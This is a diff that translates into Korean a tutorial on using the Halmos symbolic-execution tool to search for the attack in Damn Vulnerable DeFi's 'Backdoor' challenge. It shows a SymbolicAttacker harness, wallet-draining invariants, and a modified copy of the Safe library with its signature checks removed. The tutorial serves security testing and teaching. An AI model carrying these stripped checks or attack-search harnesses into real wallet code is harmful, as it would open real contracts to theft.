@@ -1,8 +1,8 @@
-# Halmos vs Backdoor
-## Halmos version
+# Halmos 대 Backdoor
+## Halmos 버전
 halmos 0.2.4.dev6+g606ac51
-## Foreword
-It is strongly assumed that the reader is familiar with the previous articles on solving 
+## 서문
+독자가 다음의 이전 문제 해결에 대한 글들에 익숙하다고 강력히 가정합니다:
 1. [Unstoppable](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/unstoppable) 
 2. [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster)
 3. [Naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/naive-receiver)
@@ -10,23 +10,23 @@ It is strongly assumed that the reader is familiar with the previous articles on
 5. [The-rewarder](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/the-rewarder)
 6. [Selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie)
 
-since the main ideas here are largely repeated and we will not dwell on them again.
+여기서 주요 아이디어는 대부분 반복되므로 다시 다루지 않을 것입니다.
 
-It is also worth noting that this article is probably the most overloaded with complex but very valuable information in the whole series. The number of issues that will have to be solved within the framework of this task is really unusually large. Therefore, for a better perception of information, I highly recommend updating your knowledge of the "usual" solution to **backdoor** and the logic of the relevant contracts.
+또한 이 글은 아마도 전체 시리즈 중에서 복잡하지만 매우 가치 있는 정보로 가장 과부하된 글일 것입니다. 이 작업의 프레임워크 내에서 해결해야 할 문제의 수는 정말 비정상적으로 많습니다. 따라서 정보를 더 잘 이해하기 위해 **backdoor**에 대한 "일반적인" 해결 방법과 관련 컨트랙트의 로직에 대한 지식을 업데이트하는 것을 강력히 권장합니다.
 
-One last thing: there will be a lot of changes to the **safe-smart-account** library contracts in this challenge.  For convenience, the "symbolic" version of **safe-smart-account** is placed separately, in `lib/safe_copy`
-## Preparation
-### Common prerequisites
-1. Copy **Backdoor.t.sol** file to **BackdoorHalmos.t.sol**.
-2. Rename `test_backdoor()` to `check_backdoor()`, so Halmos will execute this test symbolically.
-3. Avoid using **makeAddr()** cheatcode:
+마지막으로 한 가지 더: 이번 챌린지에서는 **safe-smart-account** 라이브러리 컨트랙트에 많은 변경이 있을 것입니다. 편의를 위해 **safe-smart-account**의 "심볼릭" 버전은 `lib/safe_copy`에 별도로 배치되었습니다.
+## 준비
+### 공통 필수 조건
+1. **Backdoor.t.sol** 파일을 **BackdoorHalmos.t.sol**로 복사하세요.
+2. `test_backdoor()`를 `check_backdoor()`로 이름을 바꾸세요. 그래야 Halmos가 이 테스트를 심볼릭하게 실행합니다.
+3. **makeAddr()** 치트 코드 사용을 피하세요:
     ```solidity
     address deployer = address(0xcafe0000);
     address player = address(0xcafe0001);
     address recovery = address(0xcafe0002);
     address[] users = [address(0xcafe0003), address(0xcafe0004), address(0xcafe0005), address(0xcafe0006)];
     ```
-4. Create **GlobalStorage** contract and save address-name pairs of contracts:
+4. **GlobalStorage** 컨트랙트를 생성하고 컨트랙트의 주소-이름 쌍을 저장하세요:
     ```solidity
     ...
     import "lib/GlobalStorage.sol";
@@ -43,7 +43,7 @@ One last thing: there will be a lot of changes to the **safe-smart-account** lib
         glob.add_addr_name_pair(address(walletRegistry), "WalletRegistry");
         ...
     ```
-5. Print all contract addresses:
+5. 모든 컨트랙트 주소를 출력하세요:
     ```solidity
     function check_backdoor() public checkSolvedByPlayer {
         SymbolicAttacker attacker = new SymbolicAttacker();
@@ -67,9 +67,9 @@ One last thing: there will be a lot of changes to the **safe-smart-account** lib
     [console.log] attacker           0x00000000000000000000000000000000000000000000000000000000aaaa0007
     ...
     ```
-6. `vm.getNonce` is an unsupported cheatcode. Delete it.
-### _isSolved() implementation
-The original checks look like:
+6. `vm.getNonce`는 지원되지 않는 치트 코드입니다. 삭제하세요.
+### _isSolved() 구현
+원래 확인 로직은 다음과 같습니다:
 ```solidity
 function _isSolved() private view {
     // Player must have executed a single transaction
@@ -89,7 +89,7 @@ function _isSolved() private view {
     assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
 }
 ```
-At first, you might think that, by analogy with the previous challenges, we will look for a scenario where we empty the `walletRegistry`. But, in fact, this is valid behavior. It should distribute its tokens to users as a reward. Therefore, we will check if we can empty the balance of the created wallets instead:
+처음에는 이전 챌린지들과 유추하여 `walletRegistry`를 비우는 시나리오를 찾을 것이라고 생각할 수 있습니다. 하지만 사실 이것은 유효한 동작입니다. 그것은 사용자에게 보상으로 토큰을 분배해야 합니다. 따라서 대신 생성된 지갑의 잔액을 비울 수 있는지 확인합니다:
 ```solidity
 function _isSolved() private view {
     for (uint256 i = 0; i < users.length; i++) {
@@ -101,16 +101,16 @@ function _isSolved() private view {
     }
 }
 ```
-And, taking into account the approach from [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#invariants), we will add another rather obvious invariant on `allowance`:
+그리고 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#invariants)의 접근 방식을 고려하여, `allowance`에 대해 또 다른 다소 명백한 불변 조건을 추가할 것입니다:
 ```solidity
 ...
 address symbolic_spender = svm.createAddress("symbolic_spender");
 assert(token.allowance(wallet, symbolic_spender) == 0);
 ...
 ```
-## Improvement of coverage
+## 커버리지 개선
 ### delegatecall
-For the first time, we meet with the target-call pattern, but in a new form: this time we do not make `call` but `delegatecall`:
+처음으로 타겟 호출 패턴을 만나지만, 새로운 형태입니다: 이번에는 `call`이 아니라 `delegatecall`을 합니다:
 ```javascript
 Path #22:
 ...
@@ -143,7 +143,7 @@ function simulateAndRevert(address targetContract, bytes memory calldataPayload)
     }
 }
 ```
-We will handle the `delegatecall` of a symbolic target quite simply: we will specify our **SymbolicAttacker** as the only target, and the only function should be some `handle_delegatecall()` callback, in which we will symbolically iterate through the functions using the familiar method:
+우리는 심볼릭 타겟의 `delegatecall`을 매우 간단하게 처리할 것입니다: **SymbolicAttacker**를 유일한 타겟으로 지정하고, 유일한 함수는 `handle_delegatecall()` 콜백이어야 하며, 여기서 익숙한 방법을 사용하여 함수를 심볼릭하게 반복할 것입니다:
 ```solidity
 contract SymbolicAttacker is Test, SymTest {
 ...
@@ -163,7 +163,7 @@ function simulateAndRevert(address targetContract, bytes memory calldataPayload)
         ...
 }
 ```
-There are several more such places with `delegatecall` crash:
+`delegatecall` 충돌이 있는 몇 군데가 더 있습니다:
 ```javascript
 Path #185:
 ...
@@ -186,7 +186,7 @@ function deployProxy(...) {
     }
 }
 ```
-This trace is a little bit tricky so it is not clear what happened here. But it is enough to look at the implementation of **SafeProxy** and everything will become clear:
+이 트레이스는 약간 까다로워서 여기서 무슨 일이 일어났는지 명확하지 않습니다. 하지만 **SafeProxy**의 구현을 보면 모든 것이 명확해질 것입니다:
 ```solidity
 contract SafeProxy {
     // Singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated.
@@ -223,13 +223,13 @@ contract SafeProxy {
     }
 }
 ```
-Halmos automatically performs `fallback()` (which is the only function of this contract). And inside it is `delegatecall` to its singleton. Before fixing this error, let's talk about how this feature works in general at the moment in the context of Halmos. 
+Halmos는 자동으로 `fallback()`(이 컨트랙트의 유일한 함수)을 수행합니다. 그리고 그 안에는 싱글톤으로의 `delegatecall`이 있습니다. 이 오류를 수정하기 전에, 현재 Halmos의 맥락에서 이 기능이 일반적으로 어떻게 작동하는지 이야기해 봅시다. 
 
-This contract is written in such a way that it is convenient to use any function from **Safe** while calling **safeProxy**.  And since Halmos handles the case when the function we're trying to reach from the `proxy` doesn't exist in the `singleton`, it can call a `fallback` again. So we have to add protection against recursion.
+이 컨트랙트는 **safeProxy**를 호출하는 동안 **Safe**의 모든 함수를 사용하는 것이 편리하도록 작성되었습니다. 그리고 Halmos는 `proxy`에서 도달하려는 함수가 `singleton`에 존재하지 않는 경우를 처리하므로, 다시 `fallback`을 호출할 수 있습니다. 그래서 재귀에 대한 보호를 추가해야 합니다.
 
-Next, since the `singleton` address is transmitted in a symbolic manner when creating a `proxy`, we work with some symbolic `singleton`.
+다음으로, `proxy`를 생성할 때 `singleton` 주소가 심볼릭 방식으로 전달되므로, 우리는 어떤 심볼릭 `singleton`과 작용합니다.
 
-We need to fix the "symbolic offset" error that occurs inside `SafeProxyFactory::deployProxy()`, while not damaging the main logic of this `proxy`. It's hard to think of anything better than just adding another `symbolic_fallback` function that will handle this specific case:
+`SafeProxyFactory::deployProxy()` 내부에서 발생하는 "심볼릭 오프셋" 오류를 수정하면서, 이 `proxy`의 주요 로직을 손상시키지 않아야 합니다. 이 특정 케이스를 처리할 또 다른 `symbolic_fallback` 함수를 추가하는 것보다 더 나은 방법을 생각하기 어렵습니다:
 ```solidity
 contract SafeProxy is FoundryCheats {
     address internal singleton;
@@ -303,7 +303,7 @@ function deployProxy(...) {
 }
 ```
 
-And one more place with `delegatecall`:
+그리고 `delegatecall`이 있는 또 다른 곳:
 ```solidity
 abstract contract Executor {
 ...
@@ -329,7 +329,7 @@ abstract contract Executor {
 ...
 }
 ```
-Even though this place doesn't throw a **revert**, it's still better to use `delegatecall_handler` than iterating through Halmos automatically to make it more generic.
+이 부분은 **revert**를 발생시키지는 않지만, 더 일반적인(generic) 것으로 만들기 위해 Halmos가 자동으로 반복하게 하는 것보다 `delegatecall_handler`를 사용하는 것이 여전히 더 낫습니다.
 ```solidity
 if (operation == Enum.Operation.DelegateCall) {
     // solhint-disable-next-line no-inline-assembly
@@ -337,8 +337,8 @@ if (operation == Enum.Operation.DelegateCall) {
     vm.assume(bytes4(data) == bytes4(keccak256("handle_delegatecall()")));
     ...
 ```
-### Regular symbolic memory offset
-There is also the usual `call` by symbolic calldata:
+### 일반적인 심볼릭 메모리 오프셋
+심볼릭 calldata에 의한 일반적인 `call`도 있습니다:
 ```solidity
 function execute(
         address to,
@@ -356,7 +356,7 @@ function execute(
     }
 }
 ```
-We deal with it as usual:
+우리는 평소처럼 이것을 처리합니다:
 ```solidity
 ...
 } else {
@@ -372,7 +372,7 @@ We deal with it as usual:
 }
 ...
 ```
-Another place with symbolic offset is signature checks in `Safe::execTransaction`:
+심볼릭 오프셋이 있는 또 다른 곳은 `Safe::execTransaction`의 서명 확인입니다:
 ```solidity
 function execTransaction(
 ...
@@ -406,11 +406,11 @@ bytes memory signatures
 ...
 }
 ```
-Let's handle this as we do with other cryptographic checks: we simply remove this logic, assuming that the data was entered correctly.
-### OwnerIsNotABeneficiary issue
-Before considering this problem, it is worth clarifying that it is relevant for relatively weak PCs. As practice shows, the same test on a powerful PC with a better CPU does not show this problem. Looking ahead, the problem is related to the complexity of solving computational problems and, as a result, the unstable behavior of Halmos in such cases.
+다른 암호화 확인과 마찬가지로 이것을 처리해 봅시다: 데이터가 올바르게 입력되었다고 가정하고 이 로직을 단순히 제거합니다.
+### OwnerIsNotABeneficiary 문제
+이 문제를 고려하기 전에, 이것이 비교적 약한 PC에서 관련이 있다는 점을 명확히 할 가치가 있습니다. 경험상, 더 나은 CPU를 가진 강력한 PC에서 동일한 테스트를 실행하면 이 문제가 나타나지 않습니다. 미리 말하자면, 이 문제는 계산 문제 해결의 복잡성과 그로 인한 이러한 경우 Halmos의 불안정한 동작과 관련이 있습니다.
 
-Let's try running the test now:
+이제 테스트를 실행해 봅시다:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
 ...
@@ -425,7 +425,7 @@ CALL SafeProxyFactory::createProxyWithCallback(...)
         REVERT OwnerIsNotABeneficiary ((error: Revert())
     ...
 ```
-This revert is worth our attention, because at the moment all the code of this function that follows this revert is blocked. This revert happens 100% of the time if it reaches this point (At least on my weaker PC).
+이 revert는 주목할 가치가 있습니다. 왜냐하면 이 시점에서 이 revert 이후의 이 함수의 모든 코드가 차단되기 때문입니다. 만약 이 지점(적어도 제 약한 PC에서는)에 도달한다면 이 revert는 100% 발생합니다.
 ```solidity
 function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
 ...
@@ -452,7 +452,7 @@ function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initial
     SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
 }
 ```
-This revert happens after we made a valid `call` to `createProxyWithCallback`. `setup` was executed, but for some reason Halmos cannot understand that the `owner` we passed during `setup()` can be some valid `owner`:
+이 revert는 우리가 `createProxyWithCallback`에 유효한 `call`을 한 후에 발생합니다. `setup`이 실행되었지만, 어떤 이유로 Halmos는 `setup()` 중에 우리가 전달한 `owner`가 어떤 유효한 `owner`일 수 있다는 것을 이해하지 못합니다:
 ```solidity
 function createProxyWithCallback(...) {
     uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
@@ -470,7 +470,7 @@ function setup(
     ...
 }
 ```
-Given that there is an `owners` count check before `OwnerIsNotABeneficiary` revert, at least, it sees a scenario where there is only one `owner`:
+`OwnerIsNotABeneficiary` revert 이전에 `owners` 카운트 확인이 있다는 점을 감안할 때, 적어도 `owner`가 하나만 있는 시나리오는 봅니다:
 ```solidity
 function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override {
 ...
@@ -487,7 +487,7 @@ function proxyCreated(SafeProxy proxy, address singleton, bytes calldata initial
 ...
 ```
 
-Let's print this `owner`, see why Halmos doesn't see that it can be valid:
+이 `owner`를 출력해서, 왜 Halmos가 이것이 유효할 수 있다는 것을 보지 못하는지 봅시다:
 ```solidity
 ...
 console.log("walletOwner is");
@@ -503,7 +503,7 @@ $ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
 [console.log] 0x0000000000000000000000000000000000000000000000000000000000000000
 ...
 ```
-What? `0x0`? Why not symbolic? To answer this question, we need to understand how this algorithm stores and then reads the list of `owners`:
+뭐라고요? `0x0`? 왜 심볼릭이 아닐까요? 이 질문에 답하려면, 이 알고리즘이 `owners` 목록을 어떻게 저장하고 읽는지 이해해야 합니다:
 ```solidity
 ...
 address internal constant SENTINEL_OWNERS = address(0x1);
@@ -547,8 +547,8 @@ function getOwners() public view returns (address[] memory) {
     return array;
 }
 ```
-Some clever algorithm is used, which allows you to store owners' addresses in the mapping, and then craft an array based on it. 
-The problem is that such a complex assignment of values ​​to a map by symbolic key creates a greater load on the **solver** when forming an `array`. It does not manage in the allotted time, goes to timeout, and the array gets `0x0` instead of some valid value (at least symbolic):
+매핑에 소유자의 주소를 저장한 다음, 그것을 기반으로 배열을 만들 수 있는 영리한 알고리즘이 사용됩니다.
+문제는 심볼릭 키에 의해 맵에 값을 할당하는 복잡한 작업이 `array`를 형성할 때 **solver**에 더 큰 부하를 준다는 것입니다. 할당된 시간 내에 처리하지 못하고 타임아웃되어, 배열은 유효한 값(적어도 심볼릭한 값) 대신 `0x0`을 얻습니다:
 ```solidity
 function setupOwners(address[] memory _owners, uint256 _threshold) internal {
     for (uint256 i = 0; i < _owners.length; i++) {
@@ -570,10 +570,10 @@ function getOwners() public view returns (address[] memory) {
 ...
 }
 ```
-It is, in fact, difficult to catch such Halmos behavior or even understand that something is wrong. 
+사실, 이런 Halmos의 동작을 잡거나 무엇이 잘못되었는지 이해하는 것조차 어렵습니다.
 
-Okay, let's fix it somehow. For this particular case, I propose to abandon this algorithm through mapping, and use a regular array, assuming that there are no more than 2 owners (the largest size of a dynamic array considered by Halmos by default). 
-Such a "direct" algorithm stores data in a simpler form and it is easier for Halmos to understand that `owner` should be a symbolic value:
+좋아요, 어떻게든 고쳐봅시다. 이 특정 케이스의 경우, 매핑을 통한 이 알고리즘을 버리고, 소유자가 2명 이하(Halmos가 기본적으로 고려하는 동적 배열의 가장 큰 크기)라고 가정하고 일반 배열을 사용할 것을 제안합니다.
+이런 "직접적인" 알고리즘은 데이터를 더 단순한 형태로 저장하며, Halmos가 `owner`가 심볼릭 값이어야 한다는 것을 이해하기 더 쉽습니다:
 ```solidity
 ...
 mapping(address => address) internal owners;
@@ -596,7 +596,7 @@ function getOwners() public view returns (address[] memory) {
     return array;
 }
 ```
-Run:
+실행:
 ```javascript
 $ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
 ...
@@ -604,21 +604,21 @@ $ halmos --solver-timeout-assertion 0 --function check_backdoor --loop 100
 [console.log] Concat(0x000000000000000000000000, Extract(p__owners[0]_address_c7821fc_58()))
 ...
 ```
-So much better! The code below is now unlocked as Halmos can see the scenario where `owner` is, for example **Alice** with address `0xcafe0003`.
-### solver-timeout-branching halmos option
-Now let's move on to an important `--solver-timeout-branching` parameter of Halmos. `OwnerIsNotABeneficiary` is not the only place in this challenge where the solver can behave unstable (even on a powerful CPU). If you examine several different logs with full traces of all paths that were made in different runs, you can see that they differ a lot. Halmos starts to run non-deterministically, especially if the working machine is overloaded: entire functions have been ignored. This is a clear sign that the solver does not cope with **branching**. Simply put: every time Halmos encounters a branching statement (for example `if()`), it runs a solver that determines whether the statement is **true** or **false**. And, unfortunately, sometimes the solver cannot calculate it quickly (especially in such complex setups with an overloaded number of symbolic variables). Because of this, it does not fit into the timeout allocated to it (1 ms is default timeout), and branching does not happen as we would like. In this case, Halmos can start processing paths that are mathematically known to be impossible. Normally, this isn't a big problem, but if we have a VERY abstraction overloaded setup that is vulnerable to path explosion, we can spend too much time (even hours) on such paths and not even get around to looking at valid, useful paths during the test, because it will be TOO LONG. Therefore, we need some mechanism in which we will sacrifice time for more accurate branching, gaining time for considering only valid paths!
+훨씬 낫네요! 이제 Halmos가 예를 들어 `owner`가 주소 `0xcafe0003`을 가진 **Alice**일 수 있는 시나리오를 볼 수 있으므로 아래 코드가 잠금 해제되었습니다.
+### solver-timeout-branching halmos 옵션
+이제 Halmos의 중요한 `--solver-timeout-branching` 매개변수로 넘어가 봅시다. `OwnerIsNotABeneficiary`는 이 챌린지에서 솔버가 불안정하게 동작할 수 있는 유일한 곳이 아닙니다(강력한 CPU에서도). 다른 실행에서 만들어진 모든 경로의 전체 트레이스가 담긴 여러 로그를 조사해보면, 많이 다르다는 것을 알 수 있습니다. Halmos는 특히 작업 머신이 과부하된 경우 비결정적으로 실행되기 시작합니다: 전체 함수가 무시되기도 했습니다. 이것은 솔버가 **분기(branching)**에 대처하지 못한다는 명확한 신호입니다. 간단히 말해: Halmos가 분기 문(예: `if()`)을 만날 때마다, 문이 **참**인지 **거짓**인지를 결정하는 솔버를 실행합니다. 그리고 불행히도, 때때로 솔버는 그것을 빨리 계산할 수 없습니다(특히 과부하된 수의 심볼릭 변수가 있는 복잡한 설정에서). 그래서 할당된 타임아웃(기본 타임아웃은 1ms)에 맞지 않아, 분기가 우리가 원하는 대로 발생하지 않습니다. 이 경우, Halmos는 수학적으로 불가능한 것으로 알려진 경로를 처리하기 시작할 수 있습니다. 보통 이것은 큰 문제가 아니지만, 경로 폭발(path explosion)에 취약한 매우 추상화가 과부하된 설정이 있다면, 그런 경로에 너무 많은 시간(심지어 몇 시간)을 소비하고 테스트 중에 유효하고 유용한 경로를 살펴보는 것조차 하지 못할 수 있습니다. 왜냐하면 너무 오래 걸리기 때문입니다. 따라서 더 정확한 분기를 위해 시간을 희생하고, 유효한 경로만 고려하는 시간을 벌 수 있는 메커니즘이 필요합니다!
 
-So, The solution is actually quite simple, but expensive. We simply add another startup parameter:
+그래서, 해결책은 사실 꽤 간단하지만 비용이 많이 듭니다. 시작 매개변수를 하나 더 추가하기만 하면 됩니다:
 ```javascript
 --solver-timeout-branching 0
 ```
-This completely removes the timeout for the branching solver.
+이것은 분기 솔버에 대한 타임아웃을 완전히 제거합니다.
 
-However, on the other hand, the speed of operations has significantly decreased. From `~29000` operations per second, the speed dropped to `~8000` on my machine. That is why a more correct solution would be to calibrate the timeout value for your working machine, which will allow Halmos to work stably from run to run, while not significantly slowing down the speed of operations.
+하지만 반면에, 연산 속도는 상당히 감소했습니다. 제 머신에서는 초당 `~29000` 연산에서 `~8000`으로 떨어졌습니다. 그렇기 때문에 더 올바른 해결책은 작업 머신의 타임아웃 값을 조정하여, 연산 속도를 크게 늦추지 않으면서 실행마다 Halmos가 안정적으로 작동하도록 하는 것입니다.
 
-I will use `0` anyway as an expensive but stable solution to demonstrate the capabilities of Halmos. But, again, this option should be used wisely. For example, if you run the test for the previous [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload) challenge with this parameter, it almost completely kills the performance and the solution is not found for hours.
-### create2 during test
-In this challenge, we have a unique feature: the logic of the test is based on the fact that new contracts will be created during the test.
+저는 어쨌든 Halmos의 기능을 보여주기 위해 비용이 많이 들지만 안정적인 해결책으로 `0`을 사용할 것입니다. 하지만 다시 말하지만, 이 옵션은 현명하게 사용해야 합니다. 예를 들어, 이전 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#symbolicattacker-preload) 챌린지 테스트를 이 매개변수와 함께 실행하면 성능이 거의 완전히 죽고 몇 시간 동안 해결책을 찾지 못합니다.
+### 테스트 중 create2 사용
+이 챌린지에서 우리는 독특한 특징을 가지고 있습니다: 테스트의 로직은 테스트 중에 새로운 컨트랙트가 생성된다는 사실에 기반합니다.
 ```soliidty
 function deployProxy(address _singleton, bytes memory initializer, bytes32 salt) internal returns (SafeProxy proxy) {
 ...
@@ -628,13 +628,13 @@ assembly {
 require(address(proxy) != address(0), "Create2 call failed");
 ...
 ```
-Note that Halmos completely ignores the logic with `salt` when working with `create2` and creates new contracts with addresses `0xbbbb****`. This is, in fact, convenient for us, because it turns out not a symbolic address, but a specific one.
+Halmos가 `create2`로 작업할 때 `salt` 로직을 완전히 무시하고 `0xbbbb****` 주소를 가진 새 컨트랙트를 생성한다는 점을 참고하세요. 사실 이것은 우리에게 편리합니다. 심볼릭 주소가 아니라 특정 주소가 되기 때문입니다.
 
-And of course, we do not forget that if some contract was created, it should be added to **GlobalStorage**. But it would be naive to just add the address of the new contract and its name "**SafeProxy**":
+그리고 물론, 어떤 컨트랙트가 생성되었다면 **GlobalStorage**에 추가되어야 한다는 것을 잊지 않습니다. 하지만 새 컨트랙트의 주소와 그 이름 "**SafeProxy**"만 추가하는 것은 순진한 생각일 것입니다:
 ```solidity
 glob.add_addr_name_pair(address(proxy), "SafeProxy");
 ```
-Why? Because **SafeProxy** doesn't implement any function (Let's don't take into account our `symbolic_fallback()`). Instead, any function implemented in its `singleton` can be called via **SafeProxy**. Therefore, it will be logical to add just such a pair: the address of **SafeProxy**, but the name of the contract from which calldata will be generated - as in `singleton`:
+왜냐하면 **SafeProxy**는 어떤 함수도 구현하지 않기 때문입니다(`symbolic_fallback()`은 고려하지 맙시다). 대신, `singleton`에 구현된 모든 함수는 **SafeProxy**를 통해 호출될 수 있습니다. 따라서, **SafeProxy**의 주소이지만 calldata가 생성될 컨트랙트의 이름(즉, `singleton`)을 추가하는 것이 논리적일 것입니다:
 
 ```solidity
 contract GlobalStorage is Test, SymTest {
@@ -666,8 +666,8 @@ function deployProxy(address _singleton, bytes memory initializer, bytes32 salt)
 }
 ```
 
-## Optimizations and heuristics
-### Beating recursion issue
+## 최적화 및 휴리스틱
+### 재귀 문제 해결 (Beating recursion issue)
 ```javascript
 halmos --solver-timeout-assertion 0 --solver-timeout-branching 0 --function check_backdoor --loop 100 -vvvvv
 ...
@@ -690,7 +690,7 @@ Path #9642:
 ...
 ERROR    ArgumentError: argument 1: RecursionError: maximum recursion depth exceeded 
 ```
-Due to the high complexity of the setup, we have several ways to access the `SafeProxyFactory::deployProxy` function. In addition, creating a contract through this function can call `deployProxy` again, but from a different entry point:
+설정의 높은 복잡성 때문에, `SafeProxyFactory::deployProxy` 함수에 접근하는 여러 방법이 있습니다. 게다가 이 함수를 통해 컨트랙트를 생성하면 다른 진입점에서 `deployProxy`를 다시 호출할 수 있습니다:
 ```solidity
 function createProxyWithNonce(...) public {
     ...
@@ -711,7 +711,7 @@ function createProxyWithCallback(...) public {
 }
 ...
 ```
-Therefore, the usual way of avoiding recursion by using `get_concrete_from_symbolic_optimized` is not suitable for us. Since `createProxyWithNonce` is called inside `createProxyWithCallback`, we can use the same approach as in [naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/selfie/test/naive-receiver#proxy-heuristics) and simply cut scenarios with a direct symbolic call to `createProxyWithNonce` without sacrificing overall code coverage. We will do this by banning these functions through the already familiar `add_banned_function_selector()` from [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#solid-optimizations):
+따라서 `get_concrete_from_symbolic_optimized`를 사용하여 재귀를 피하는 일반적인 방법은 우리에게 적합하지 않습니다. `createProxyWithNonce`는 `createProxyWithCallback` 내부에서 호출되므로, [naive-receiver](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/selfie/test/naive-receiver#proxy-heuristics)와 동일한 접근 방식을 사용하여, 전체 코드 커버리지를 희생하지 않으면서 `createProxyWithNonce`에 대한 직접적인 심볼릭 호출 시나리오를 단순히 잘라낼 수 있습니다. 우리는 [selfie](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/selfie#solid-optimizations)에서 이미 익숙한 `add_banned_function_selector()`를 통해 이 함수들을 금지함으로써 이를 수행할 것입니다:
 ```solidity
 function setUp() public {
     ...
@@ -720,13 +720,13 @@ function setUp() public {
     vm.stopPrank();
 }
 ```
-The `createChainSpecificProxyWithNonce` function was also banned as its only difference from `createProxyWithNonce` is the generated salt. And since Halmos completely ignores salt when creating contracts via `create2` - there is no point in checking this function separately.
-### State snapshots
-Until now, when using symbolic calls, we never checked whether it ended with a **revert** or whether the transaction was successful. In fact, this only inflates the number of possible paths, since even if the transaction fails, we continue to check the path. And, as practice shows, we can only be interested in transactions that somehow changed the state of the contracts. Now we will use a cool new approach via **state snapshots**, which became possible after the Halmos 0.2.3 update.
+`createChainSpecificProxyWithNonce` 함수도 금지되었습니다. `createProxyWithNonce`와의 유일한 차이점은 생성된 salt이기 때문입니다. 그리고 Halmos는 `create2`를 통해 컨트랙트를 생성할 때 salt를 완전히 무시하므로 이 함수를 별도로 확인할 필요가 없습니다.
+### 상태 스냅샷 (State snapshots)
+지금까지 우리는 심볼릭 호출을 사용할 때, 그것이 **revert**로 끝났는지 아니면 트랜잭션이 성공했는지 확인한 적이 없습니다. 사실, 이것은 가능한 경로의 수를 부풀릴 뿐입니다. 트랜잭션이 실패하더라도 경로를 계속 확인하기 때문입니다. 그리고 경험상, 우리는 컨트랙트의 상태를 어떻게든 변경한 트랜잭션에만 관심이 있을 수 있습니다. 이제 Halmos 0.2.3 업데이트 이후 가능해진 **상태 스냅샷**을 통한 멋진 새로운 접근 방식을 사용할 것입니다.
 
-Its essence is simple: before any symbolic `call`, we generate a `uint` dump of the current state of the system. After that `call` - read dump again and compare with the previous one. If the state did not change, it was guaranteed to be an "empty" transaction and there is no point in continuing to execute this path. 
+그 본질은 간단합니다: 심볼릭 `call` 전에, 현재 시스템 상태의 `uint` 덤프를 생성합니다. 그 `call` 후에 - 덤프를 다시 읽고 이전 것과 비교합니다. 상태가 변경되지 않았다면, 그것은 "빈" 트랜잭션임이 보장되며 이 경로를 계속 실행할 의미가 없습니다.
 
-One example of such an approach:
+그러한 접근 방식의 한 예:
 ```solidity
 function execute_tx(string memory target_name) private {
     ...
@@ -736,9 +736,9 @@ function execute_tx(string memory target_name) private {
     vm.assume(snap0 != snap1);
 }
 ```
-To understand how strong this improvement is, it is enough to say that experiments with [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster) showed x5 speedup in finding solution.
-### simulateAndRevert function
-Let's look on this function from **safe-smart-account**:
+이 개선이 얼마나 강력한지 이해하기 위해, [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster) 실험에서 해결책을 찾는 데 5배의 속도 향상을 보였다고 말하는 것으로 충분합니다.
+### simulateAndRevert 함수
+**safe-smart-account**의 이 함수를 살펴봅시다:
 ```solidity
 function simulateAndRevert(address targetContract, bytes memory calldataPayload) external {
     // solhint-disable-next-line no-inline-assembly
@@ -752,16 +752,16 @@ function simulateAndRevert(address targetContract, bytes memory calldataPayload)
     }
 }
 ```
-It is built in such a way that it is guaranteed to avoid side effects. Since it can produce a whole tree of symbolic calls that are guaranteed to lead to nothing, we will simply disable it for optimization:
+이것은 부작용을 피하도록 보장하는 방식으로 만들어졌습니다. 아무것도 아닌 것으로 이어지는 것이 보장된 전체 심볼릭 호출 트리를 생성할 수 있으므로, 최적화를 위해 단순히 비활성화할 것입니다:
 ```solidity
 glob.add_banned_function_selector(bytes4(keccak256("simulateAndRevert(address,bytes)")));
 ```
-## Counterexample analysis
-At this stage, we have 2 news: good and bad. 
+## 반례 분석 (Counterexample analysis)
+이 단계에서 2가지 뉴스가 있습니다: 좋은 소식과 나쁜 소식.
 
-Bad: After running the test and letting it to work for 12 hours, I still couldn't finish it on my machine. And it's not about recursion, the setup is really very abstract and easily leads to path explosion. And let me remind you, we run only one attacking transaction in **SymbolicAttacker**.
+나쁜 소식: 테스트를 실행하고 12시간 동안 작동하게 둔 후에도, 제 머신에서는 여전히 완료할 수 없었습니다. 그것은 재귀 때문이 아닙니다. 설정이 정말 매우 추상적이고 경로 폭발로 이어지기 쉽습니다. 그리고 상기시켜 드릐자면, 우리는 **SymbolicAttacker**에서 단 하나의 공격 트랜잭션만 실행합니다.
 
-Good: After about 40 minutes, it starts generating valid counterexamples: 
+좋은 소식: 약 40분 후, 유효한 반례를 생성하기 시작합니다:
 ```javascript
 halmos --solver-timeout-assertion 0 --solver-timeout-branching 0 --function check_backdoor --loop 100
 ...
@@ -803,113 +803,11 @@ WARNING  Counterexample (potentially invalid):
              p_value_uint256_41861fd_12 = 0x0000000000000000000000000000000000000000000000000000000000000000
              ...
 ```
